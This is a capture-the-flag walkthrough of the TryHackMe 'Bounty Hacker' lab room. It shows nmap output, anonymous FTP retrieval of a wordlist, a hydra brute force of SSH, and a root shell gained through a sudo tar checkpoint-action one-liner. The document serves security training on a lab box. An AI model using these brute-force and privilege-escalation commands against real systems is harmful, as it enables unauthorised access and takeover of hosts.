# Bounty Hacker

At first I thought that [this](https://tryhackme.com/room/cowboyhacker) room might be a bit difficult though rated as Beginner (only on the basis of the name). Don't know why but it gave me a feeling that it'll be something really challenging. But I must say that this room is one of the most easiest rooms on TryHackMe. And also, it does not even take time to solve!

So, let's begin!

### Initial Foothold

1. ##### Deploy the machine.

First of all, we need to deploy the machine and get the IP address. We can then visit the IP address and find an animated image and a conversation among 4 people. 

![homepage](./.images/homepage.png)

We can check the source-code of the page as well but even there we won't find anything that useful. So, we can get started with our usual nmap scan.

2. ##### Find open ports on the machine

The results of the nmap scan for OS and port detection:

```
root@kali:~# nmap -A -p- -T4 10.10.116.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 23:15 UTC
Nmap scan report for ip-10-10-116-111.eu-west-1.compute.internal (10.10.116.111)
Host is up (0.00050s latency).
Not shown: 55529 filtered ports, 10003 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.172.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:AF:39:BE:67:D1 (Unknown)
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.10 - 3.13 (89%), Linux 3.8 (89%), Linux 2.6.32 - 3.1 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms ip-10-10-116-111.eu-west-1.compute.internal (10.10.116.111)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.34 seconds
```

From this result, we can simply count the number of open ports and use it as the answer for the second question.

3. ##### Who wrote the task list? 

From the list of open ports, we can see that FTP is running at port 21. Along with that it is also mentioned that anonymous login is allowed. So, without even a second thought we must check what all data is accessible via FTP. 

``` 
root@kali:~# ftp 10.10.116.111 21
Connected to 10.10.116.111.
220 (vsFTPd 3.0.3)
Name (10.10.116.111:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.06 secs (7.3756 kB/s)
mget task.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.07 secs (0.9067 kB/s)
ftp> 
```

Once connected via FTP as `anonymous`, we can see that there are two files namely `tasks.txt` and `locks.txt`. We can download both of them on our local machine using the `mget` command.

The question asks about 'who wrote the task list?' and the answer to that can be found in the file tasks.txt.

4. ##### What service can you bruteforce with the text file found?

We have found two file, but `tasks.txt` does not contain any data that can be used for bruteforcing but the file `locks.txt` does contain a number of strings that appear to be different permutations of a password. Also, we can see from the nmap scan that on port 22 a service is running. So, we can use this file to bruteforce the password required to access that service as we know the username as well.

5. ##### What is the users password? 

We can use `hydra` to bruteforce the password for the specific service open on port 22.

```
root@kali:~# hydra -l xxx -P locks.txt 10.10.116.111 ***
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-06 23:35:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.116.111:22/
[22][ssh] host: 10.10.116.111   login: xxx   password: XXXXXXXXXXXXXXXXXX
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-06 23:35:10
```

So, now with the help of hydra we know the password as well.

6. ##### user.txt

Now that we know both the username and password, we can simply log in to the user's account via SSH.

```
root@kali:~# ssh xxx@10.10.116.111
```

Once, logged in we can read the `user.txt` file and get our required flag.

7. ##### root.txt

For this task, we can first check which commands can our user run with `sudo` privileges. This can be done as:

```
lin@bountyhacker:~/Desktop$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

It can be seen that the user can run the command `/bin/tar` with `root` privileges. So, we can now look for [GTFOBins](https://gtfobins.github.io/) for this command. Over there we can find one command to get an interactive system shell:

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

We can copy and paste this command in our SSH session along with `sudo` at the beginning so that the command executes as root.

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# pwd
/home/lin/Desktop
# cat /root/root.txt
```

With this, we got the root flag as well and we solved the box!

## Some Key Points to Take Away

Just keep your eyes open and look at everything you have access to!

